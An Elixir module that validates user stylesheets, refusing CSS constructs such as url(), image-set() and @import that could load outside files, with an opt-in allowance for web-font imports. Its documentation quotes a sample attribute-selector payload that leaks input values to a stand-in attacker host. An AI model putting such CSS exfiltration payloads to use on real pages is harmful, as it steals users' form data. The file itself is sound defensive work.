defmodule Mythweaver.Stylesheets.Policy do
  @moduledoc """
  The safe subset a user's stylesheet is held to while `appearance.restrict_user_css` is on: CSS
  that loads nothing from outside the app.

  The threat is a pasted theme that reads the page through attribute selectors
  (`input[value^="a"] { background: url(https://evil.example/a) }`) and reports each match by fetching
  a URL. Refusing every construct that can name a file (`url()` and its kin, `@import`) closes that
  channel; everything else in CSS only restyles the page the user is already looking at.

  The check runs on tokens (`Mythweaver.Stylesheets.Tokenizer`), not on text or a parse tree. CSS
  tokenization does not depend on context, so the browser splits the served file into exactly these
  tokens, and the stored text is served verbatim with nothing re-serialized in between. Escapes are
  decoded first (`\\75 rl(` is `url(`), vendor prefixes stripped, and names compared
  ASCII-case-insensitively, as the browser compares them. Strings and comments are inert.

  With `webfonts: true`, an `@import` whose URL `Mythweaver.Stylesheets.Webfonts.provider/1` accepts
  passes. That is safe because an `@import` is unconditional: no selector gates it, so it cannot
  report page content. Its URL is fixed text the user typed, and the request goes to the font
  service. The tokens after the URL (`layer()`, `supports()`, media queries) are still checked.
  """

  alias Mythweaver.Stylesheets.Tokenizer
  alias Mythweaver.Stylesheets.Webfonts

  @type options :: [webfonts: boolean()]

  @refused_functions ~w(url src image image-set cross-fade)

  # `@font-face` is fine: its only file sources are `url()` and `src()`, both refused.
  @allowed_at_rules ~w(media supports layer container keyframes property scope starting-style
                       counter-style font-face font-palette-values)

  @doc """
  `:ok` when `css` loads no outside files; else the first offending construct in document order,
  written as `"url()"`, `"image-set()"` or `"@import"`.

  Options:

    * `:webfonts` - when `true`, an `@import` of a font stylesheet that
      `Mythweaver.Stylesheets.Webfonts.provider/1` accepts is allowed. Defaults to `false`.
  """
  @spec check(String.t(), options()) :: :ok | {:error, String.t()}
  def check(css, opts \\ []) when is_binary(css) do
    css |> Tokenizer.tokenize() |> scan(Keyword.get(opts, :webfonts, false))
  end

  defp scan([], _webfonts?), do: :ok

  defp scan([{:at_keyword, name} | rest] = tokens, true) do
    with "import" <- String.downcase(name, :ascii),
         {:ok, url, after_url} <- import_url(rest),
         provider when not is_nil(provider) <- Webfonts.provider(url) do
      scan(after_url, true)
    else
      _ -> step(tokens, true)
    end
  end

  defp scan(tokens, webfonts?), do: step(tokens, webfonts?)

  defp step([token | rest], webfonts?) do
    case violation(token) do
      nil -> scan(rest, webfonts?)
      error -> error
    end
  end

  # The URL an `@import` prelude starts with, and the tokens after it.
  defp import_url([:whitespace | rest]), do: import_url(rest)
  defp import_url([{:url, url} | rest]), do: {:ok, url, rest}
  defp import_url([{:string, url} | rest]), do: {:ok, url, rest}

  defp import_url([{:function, name} | rest]) do
    with "url" <- String.downcase(name, :ascii),
         [{:string, url} | rest] <- drop_whitespace(rest),
         [:close_paren | rest] <- drop_whitespace(rest) do
      {:ok, url, rest}
    else
      _ -> :error
    end
  end

  defp import_url(_tokens), do: :error

  defp drop_whitespace(tokens), do: Enum.drop_while(tokens, &(&1 == :whitespace))

  defp violation({:url, _}), do: {:error, "url()"}
  defp violation(:bad_url), do: {:error, "url()"}

  defp violation({:function, name}) do
    if unprefixed(name) in @refused_functions, do: {:error, "#{String.downcase(name, :ascii)}()"}
  end

  defp violation({:at_keyword, name}) do
    if unprefixed(name) not in @allowed_at_rules, do: {:error, "@#{String.downcase(name, :ascii)}"}
  end

  defp violation(_token), do: nil

  defp unprefixed(name) do
    case String.downcase(name, :ascii) do
      "-webkit-" <> rest -> rest
      "-moz-" <> rest -> rest
      "-o-" <> rest -> rest
      "-ms-" <> rest -> rest
      name -> name
    end
  end
end
